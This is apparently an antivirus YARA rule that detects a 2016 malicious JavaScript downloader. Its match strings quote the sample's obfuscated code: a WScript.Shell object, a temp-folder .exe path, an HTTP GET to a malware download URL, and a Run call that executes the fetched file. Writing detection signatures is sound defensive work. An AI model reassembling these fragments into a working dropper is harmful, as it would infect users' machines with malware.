rule sig_20160328_afbd6ebb0856b60d9ed9d9338ed26c9f {
  meta:
    description = "datamaliciousorder - file 20160328_afbd6ebb0856b60d9ed9d9338ed26c9f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "680d0e14ef628510912ba281d27929a18d1be267c1d3747dbecd11920e8356ab"

  strings:
    $s1  = "function Bhyclbn() {return Wkapqu[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"gNDrT4abeJALIF5t.exe\";};" fullword ascii
    $s2  = "Lxspw[Vfxckvpfxc](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Ixrcjvlyf](Rthcphwpa() * 11)} while (Lxspw[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Wkapqu = function Ockjkkqtpu() {return WScript[Fmtggvhtrr](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Ggyfxq(Mqido, Penippel){return Mqido - Penippel;};" fullword ascii
    $s6  = "function Pyfkl() {return ((Dloxssdvd == true) && (Dloxssdvd == Uhkrlfolz)) ? 1 : Gmqcrfjl;};" fullword ascii
    $s7  = "function Zjpeer(Mdznonjdkb){Wkapqu[\"Run\"](Mdznonjdkb, Gmqcrfjl, Gmqcrfjl);};" fullword ascii
    $s8  = "function Okvibnylr(){return Fmtggvhtrr;};" fullword ascii
    $s9  = "Dloxssdvd = true; " fullword ascii
    $s10 = " while (Itqdcegip){" fullword ascii
    $s11 = "var Uhkrlfolz = false;" fullword ascii
    $s12 = "function Rthcphwpa(){return 22;};" fullword ascii
    $s13 = "var Bknsdfpwvi = false;" fullword ascii
    $s14 = "return Ggyfxq(Ojkkoch, Myfopgu);" fullword ascii
    $s15 = "function Hylzmzrrw()" fullword ascii
    $s16 = "function Pcnbikjfqd(){return Twhjet;};" fullword ascii
    $s17 = "var Dloxssdvd = false;" fullword ascii
    $s18 = "Uhkrlfolz = true; " fullword ascii
    $s19 = "var Rzvwtjvgyg = new this[\"Date\"]();" fullword ascii
    $s20 = "function Bpqnvbgl(Jdlcax) {var Etqzr = (1, 2, 3, 4, 5, Jdlcax); return Etqzr;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}